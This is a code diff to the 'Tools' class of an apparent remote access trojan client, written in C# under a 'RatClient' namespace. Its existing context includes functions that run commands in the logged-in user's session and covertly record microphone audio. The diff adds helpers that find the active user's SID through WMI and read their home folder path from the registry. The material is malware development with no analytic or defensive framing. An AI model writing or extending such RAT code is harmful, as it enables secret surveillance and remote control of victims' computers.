@@ -1,4 +1,5 @@
 ﻿using System;
+using Microsoft.Win32;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.Linq;
@@ -6,6 +7,7 @@ using System.Drawing;
 using System.IO;
 using System.Runtime.InteropServices;
 using RatClient.Mtool;
+using System.Management;
 
 
 
@@ -16,12 +18,14 @@ public class Tools
     {
         return Process.GetProcessesByName(name.Replace(".exe", ""))[0].Id;
     }
-    public static byte[] RunAsCurrentUser(string command)
+
+
+    public static byte[] RunAsCurrentUser(string process, string command)
     {
         List<byte> output = new List<byte>(); 
         IntPtr hRead;
         int chunck = 4096;
-        int res = NativeMethods.RunAsLoggedInUser("cmd.exe /c " + command, out hRead);
+        int res = NativeMethods.RunAsLoggedInUser(process + command, out hRead);
         if (res == 0)
         {
             byte[] buffer = new byte[chunck];
@@ -108,6 +112,7 @@ public class Tools
             }
         }
     }
+
     public static byte[] RecordAudio(string time)
     {
         char type = time[time.Length - 1];
@@ -123,6 +128,7 @@ public class Tools
         System.Threading.Thread.Sleep(range);
         return ar.StopRecording();
     }
+
     public static byte[] RunCommand(string command)
     {
         byte[] outputBytes = null;
@@ -150,5 +156,43 @@ public class Tools
 
 
         return outputBytes;
+    }
+
+    public static string GetUserSid()
+    {
+        string sid;
+        string query = "SELECT UserName FROM Win32_ComputerSystem";
+        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+        {
+            var username = (string)searcher.Get().Cast<ManagementBaseObject>().First()["UserName"];
+
+            string[] res = username.Split('\\');
+            if (res.Length != 2) throw new InvalidOperationException("Invalid username format.");
+
+            string domain = res[0];
+            string name = res[1];
+            query = $"SELECT Sid FROM Win32_UserAccount WHERE Domain = '{domain}' AND Name = '{name}'";
+            using (ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(query))
+            {
+                sid = (string)searcher2.Get().Cast<ManagementBaseObject>().First()["Sid"];
+            }
+        }
+        return sid;
+    }
+
+    public static string HomePath()
+    {
+        using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
+        {
+            using (RegistryKey subkey = key.OpenSubKey($"Software\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{GetUserSid()}"))
+            {
+                object value = subkey.GetValue("ProfileImagePath");
+                if (value != null)
+                {
+                    return value.ToString();
+                }
+            }
+        }
+        return null;
     }
 }
